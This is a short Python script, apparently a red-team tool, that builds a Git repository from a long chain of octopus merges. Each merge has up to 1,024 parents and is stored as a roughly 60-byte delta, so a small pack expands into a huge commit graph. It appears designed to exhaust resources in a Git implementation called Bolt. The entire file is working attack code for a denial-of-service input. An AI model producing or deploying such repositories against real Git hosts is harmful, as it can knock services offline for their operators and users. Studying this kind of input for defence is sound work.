"""Builds the octopus-chain repository: K root commits, then a chain of N merges, each with the
previous merge and K-1 of the roots as parents (K <= 1,024, Bolt's limit). Each merge after the
first is stored as a ~60-byte delta on the first, so the pack grows ~100 bytes a commit.
Usage: python3 -I octopus.py <dir> <N> [K]"""
import sys

sys.path.insert(0, "/work/redteam/attacks3")
from gitrepo import Repo, PackWriter, oid, commit_bytes, copy_op, insert_ops, varint

root, n = sys.argv[1], int(sys.argv[2])
k = int(sys.argv[3]) if len(sys.argv) > 3 else 1024
repo = Repo(root)
pack = PackWriter(repo, 1 + k + n)
tree = oid(b"tree", b"")
pack.whole(b"tree", b"", tree)
roots = []
for j in range(k):
    data = commit_bytes(tree, [], b"root %d\n" % j)
    i = oid(b"commit", data)
    pack.whole(b"commit", data, i)
    roots.append(i)
# The first merge, stored whole: every later one is this with its first parent line swapped.
base = commit_bytes(tree, roots, b"merge\n")
tip = oid(b"commit", base)
base_at = pack.whole(b"commit", base, tip)
head, tail = 46, 46 + 48  # "tree <hex>\n", then the first "parent <hex>\n"
for _ in range(n - 1):
    data = base[:head] + b"parent " + tip.hex().encode() + b"\n" + base[tail:]
    delta = (varint(len(base)) + varint(len(data)) + copy_op(0, head)
             + insert_ops(data[head:tail]) + copy_op(tail, len(base) - tail))
    tip = oid(b"commit", data)
    pack.ofs_delta(base_at, delta, tip)
pack.finish()
repo.ref("refs/heads/main", tip)
